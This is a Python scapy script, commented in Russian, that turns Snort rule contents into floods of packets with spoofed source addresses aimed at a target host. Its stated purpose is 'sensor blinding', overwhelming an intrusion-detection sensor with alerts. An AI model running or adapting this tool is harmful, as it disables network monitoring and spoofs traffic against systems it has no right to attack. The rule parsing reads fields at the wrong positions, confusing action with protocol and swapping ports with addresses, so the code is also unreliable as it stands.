import sys
from scapy.all import *

def parse_snort_rules(rules_file):
    # Список для хранения параметров правил
    parsed_rules = []

    # Чтение правил из файла
    with open(rules_file, 'r') as f:
        rules = f.read().splitlines()

    # Парсинг правил
    for rule in rules:
        parts = rule.split()

        # Извлечение протокола, source и destination адресов и портов, а также содержимого
        protocol = parts[0]
        source_port = parts[2]
        source_address = parts[3]
        destination_port = parts[5]
        destination_address = parts[6]
        content = " ".join(parts[7:])

        parsed_rules.append({
            "protocol": protocol,
            "source_port": source_port,
            "source_address": source_address,
            "destination_port": destination_port,
            "destination_address": destination_address,
            "content": content
        })

    return parsed_rules

def send_sensor_blinding_packets(rules_file, target_host, target_port, num_packets):
    # Парсинг правил
    parsed_rules = parse_snort_rules(rules_file)

    # Формирование и отправка пакетов
    for _ in range(num_packets):
        for rule in parsed_rules:
            # Формирование TCP пакета
            if rule["protocol"] == "tcp":
                pkt_tcp = IP(dst=target_host, src=rule["source_address"])/TCP(dport=target_port, sport=int(rule["source_port"]))/Raw(load=rule["content"])
                send(pkt_tcp, verbose=False)

            # Формирование UDP пакета
            elif rule["protocol"] == "udp":
                pkt_udp = IP(dst=target_host, src=rule["source_address"])/UDP(dport=target_port, sport=int(rule["source_port"]))/Raw(load=rule["content"])
                send(pkt_udp, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python script.py <rules_file> <target_host> <target_port> <num_packets>")
        sys.exit(1)

    rules_file = sys.argv[1]
    target_host = sys.argv[2]
    target_port = int(sys.argv[3])
    num_packets = int(sys.argv[4])

    send_sensor_blinding_packets(rules_file, target_host, target_port, num_packets)
